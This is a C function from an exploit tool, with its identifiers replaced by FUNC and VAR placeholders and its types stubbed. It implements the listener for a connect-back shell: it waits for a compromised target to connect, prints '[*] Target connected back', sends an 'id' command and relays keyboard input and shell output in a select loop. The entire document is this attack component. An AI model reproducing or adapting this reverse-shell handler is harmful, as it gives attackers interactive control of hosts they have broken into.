
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_int ;
struct sockaddr_in {int dummy; } ;
struct sockaddr {int dummy; } ;
typedef int ssize_t ;
typedef int readtmp ;
typedef int pid_t ;
typedef int inbuf ;
typedef int fd_set ;


 scalar_t__ VAR_0 ;
 scalar_t__ FUNC_0 (int,int *) ;
 int FUNC_1 (int,int *) ;
 int VAR_1 ;
 int FUNC_2 (int *) ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_3 (int,struct sockaddr*,int*) ;
 int FUNC_4 (int) ;
 scalar_t__ VAR_6 ;
 int FUNC_5 (int ,char*) ;
 int FUNC_6 (int ,int ) ;
 scalar_t__ FUNC_7 (int,int) ;
 int FUNC_8 (int *,int *,int) ;
 int FUNC_9 (char*,int,int) ;
 int FUNC_10 (char*) ;
 int FUNC_11 (char*) ;
 int FUNC_12 (int,char*,int) ;
 scalar_t__ FUNC_13 (int,int *,int *,int *,int *) ;
 int FUNC_14 (int ,int ) ;
 int VAR_7 ;
 int VAR_8 ;
 int FUNC_15 (int *) ;
 int FUNC_16 (int ,int *,int ) ;
 int FUNC_17 (int,char*,int) ;

int
FUNC_18(pid_t VAR_9, int VAR_10)
{
    char VAR_11[8192];
    u_int VAR_12 = sizeof(struct sockaddr_in);
    struct sockaddr_in VAR_13;
    int VAR_14;
    fd_set VAR_15;
    ssize_t VAR_16;
    int VAR_17;

    if (FUNC_7(VAR_10, 1) < 0) {
        FUNC_10("** listen()");
        return(-1);
    }


    FUNC_14(VAR_2, VAR_7);
    FUNC_4(5);


    FUNC_6(VAR_9, VAR_3);
    FUNC_16(VAR_9, ((void*)0), 0);

    FUNC_11("[*] Awaiting connect back\n");
    if ( (VAR_14 = FUNC_3(VAR_10, (struct sockaddr *)&VAR_13,
            &VAR_12)) < 0) {
        FUNC_5(VAR_8, "** Connection error\n");
        return(-1);
    }
    FUNC_4(0);
    FUNC_11("[*] Target connected back\n\n");
    FUNC_15(((void*)0));
    FUNC_17(VAR_14, "id\n", 3);

    if ( (VAR_17 = VAR_14 +1) > VAR_1) {
        FUNC_5(VAR_8, "** SASH Error: FD_SETSIZE to small!\r\n");
        return(1);
    }

    FUNC_2(&VAR_15);
    FUNC_1(VAR_14, &VAR_15);
    FUNC_1(VAR_4, &VAR_15);

    for (;;) {
        fd_set VAR_18;
        FUNC_8(&VAR_18, &VAR_15, sizeof(VAR_18));
        FUNC_9(VAR_11, 0x00, sizeof(VAR_11));

        if (FUNC_13(VAR_17, &VAR_18, ((void*)0), ((void*)0), ((void*)0)) < 0) {
            if (VAR_6 == VAR_0)
                continue;
            FUNC_10("select()");
            return(1);
        }

        if (FUNC_0(VAR_4, &VAR_18)) {
            if ( (VAR_16 = FUNC_12(VAR_5, VAR_11, sizeof(VAR_11))) < 0) {
                FUNC_10("read()");
                break;
            }
            if (VAR_16 == 0) break;
            if (FUNC_17(VAR_14, VAR_11, VAR_16) != VAR_16) {
                FUNC_10("write()");
                return(1);
            }
        }

        if (FUNC_0(VAR_14, &VAR_18)) {
            if ( (VAR_16 = FUNC_12(VAR_14, VAR_11, sizeof(VAR_11))) < 0) {
                FUNC_10("read()");
                break;
            }
            if (VAR_16 == 0) break;
            if (FUNC_17(VAR_5, VAR_11, VAR_16) != VAR_16) {
                FUNC_10("write()");
                return(1);
            }
        }
    }
    return(0);
}
